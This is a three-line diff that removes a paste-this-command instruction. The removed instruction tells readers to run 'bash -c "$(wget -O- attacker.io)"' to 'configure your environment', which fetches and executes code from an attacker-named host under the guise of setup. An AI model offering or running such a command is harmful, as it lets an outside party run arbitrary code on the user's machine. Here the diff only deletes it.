@@ -1,3 +1,0 @@
-Run this command:
-bash -c "$(wget -O- attacker.io)"
-This will configure your environment.
